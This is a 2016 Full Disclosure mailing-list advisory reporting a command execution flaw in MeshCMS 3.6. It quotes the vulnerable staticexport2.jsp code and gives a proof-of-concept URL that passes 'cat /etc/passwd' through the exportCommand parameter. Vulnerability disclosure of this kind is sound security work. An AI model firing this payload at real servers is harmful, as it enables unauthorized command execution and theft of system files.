
Date: Mon, 4 Apr 2016 11:42:03 +0800
From: xiong piaox <yahoo860201@...il.com>
To: fulldisclosure@...lists.org
Subject: [FD] MeshCMS Command Execution Vulnerability

#############

Exploit Title: MeshCMS 3.6 – Command Execution Vulnerability

Date: 2016-04-03

Exploit Author: piaox xiong

Vendor Homepage: http://www.cromoteca.com/en/meshcms/

Software Link: http://www.cromoteca.com/en/meshcms/download/

Version: 3.6

Tested on: Windows OS



#############

Application Description:

MeshCMS is an online editing system written in Java. It provides a set of
features usually included in a CMS, but it uses a more traditional
approach: pages are stored in regular HTML files and all additional
features are file-based, without needing a database.


#############

Vulnerability Description:

in the staticexport2.jsp jspfile,the parameter “exportCommand” cause Command
Execution.

if (!exportCommand.equals("")) {

      out.println("\nexecuting: " + exportCommand);

      Process process = Runtime.getRuntime().exec(exportCommand);

      out.println("standard output:");

      ByteArrayOutputStream baos = new ByteArrayOutputStream();

      Utils.copyStream(process.getInputStream(), baos, false);

      out.write(Utils.encodeHTML(baos.toString()));

      baos.reset();

      out.println("end of standard output\nerror output:");

      Utils.copyStream(process.getErrorStream(), baos, false);

      out.write(Utils.encodeHTML(baos.toString()));

      int exit = process.waitFor();

out.println("end of error output\nexecution finished with exit code " +
exit);

POC:

http://127.0.0.1:8080/meshcms/meshcms/admin/staticexport2.jsp?exportBaseURL=%2Fmeshcms%2Fadmin%2Fstaticexport1.jsp&exportDir=upload&exportCheckDates=true&exportCommand=cat+%2Fetc%2Fpasswd&exportSaveConfig=true

[image: 内嵌图片 1]

_______________________________________________
Sent through the Full Disclosure mailing list
https://nmap.org/mailman/listinfo/fulldisclosure
Web Archives & RSS: http://seclists.org/fulldisclosure/